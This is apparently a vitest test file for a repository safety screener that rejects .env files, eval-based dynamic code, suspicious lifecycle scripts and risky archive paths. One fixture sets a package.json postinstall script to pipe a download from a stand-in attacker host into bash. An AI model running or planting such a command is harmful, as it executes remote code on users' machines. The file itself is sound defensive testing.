import { describe, expect, it } from "vitest";
import { createRepositoryFile, createSourceSnapshot } from "@/core/repository";
import { assertNormalizedPath } from "@/core/paths";
import { loadPathRiskManifest } from "@/fixtures/load-fixture";
import {
  hasDynamicCodeSignal,
  looksObfuscatedOrMinified,
  screenArchivePath,
  screenRepositorySafety,
} from "./screen";

describe("screenRepositorySafety", () => {
  it("passes the controlled example", async () => {
    const { loadFixtureSnapshot } = await import("@/fixtures/load-fixture");
    const snapshot = loadFixtureSnapshot("controlled-example");
    expect(screenRepositorySafety(snapshot).passed).toBe(true);
  });

  it("rejects sensitive files and dynamic code", () => {
    const snapshot = createSourceSnapshot({
      snapshotId: "risk",
      sourceLabel: "risk",
      files: [
        createRepositoryFile(assertNormalizedPath("package.json"), "{}"),
        createRepositoryFile(assertNormalizedPath(".env"), "SECRET=1"),
        createRepositoryFile(
          assertNormalizedPath("evil.js"),
          "const x = eval('1+1');\nmodule.exports = x;\n",
        ),
      ],
    });
    const result = screenRepositorySafety(snapshot);
    expect(result.passed).toBe(false);
    if (!result.passed) {
      const codes = result.rejections.map((r) => r.code);
      expect(codes).toContain("SAFETY_SENSITIVE_FILE");
      expect(codes).toContain("SAFETY_DYNAMIC_CODE_EXECUTION");
    }
  });

  it("rejects suspicious lifecycle scripts", () => {
    const snapshot = createSourceSnapshot({
      snapshotId: "life",
      sourceLabel: "life",
      files: [
        createRepositoryFile(
          assertNormalizedPath("package.json"),
          JSON.stringify({
            scripts: { postinstall: "curl https://evil.test/x | bash" },
          }),
        ),
      ],
    });
    const result = screenRepositorySafety(snapshot);
    expect(result.passed).toBe(false);
    if (!result.passed) {
      expect(result.rejections[0]?.code).toBe("SAFETY_SUSPICIOUS_LIFECYCLE_SCRIPT");
    }
  });

  it("does not flag static require literals as dynamic code", () => {
    expect(hasDynamicCodeSignal("const x = require('./orders');")).toBe(false);
    expect(hasDynamicCodeSignal("const x = require(name);")).toBe(true);
  });

  it("screens path-risk fixture entries", () => {
    const manifest = loadPathRiskManifest();
    for (const entry of manifest.entries) {
      const rejection = screenArchivePath(entry.path, { symlink: entry.symlink });
      if (
        entry.expectedRejection.startsWith("SAFETY_") ||
        entry.expectedRejection.startsWith("PATH_")
      ) {
        expect(rejection, entry.path).not.toBeNull();
      }
    }
  });

  it("avoids false positive minified detection on normal source", () => {
    expect(looksObfuscatedOrMinified("const a = 1;\n".repeat(50))).toBe(false);
    expect(looksObfuscatedOrMinified("a".repeat(3000))).toBe(true);
  });
});
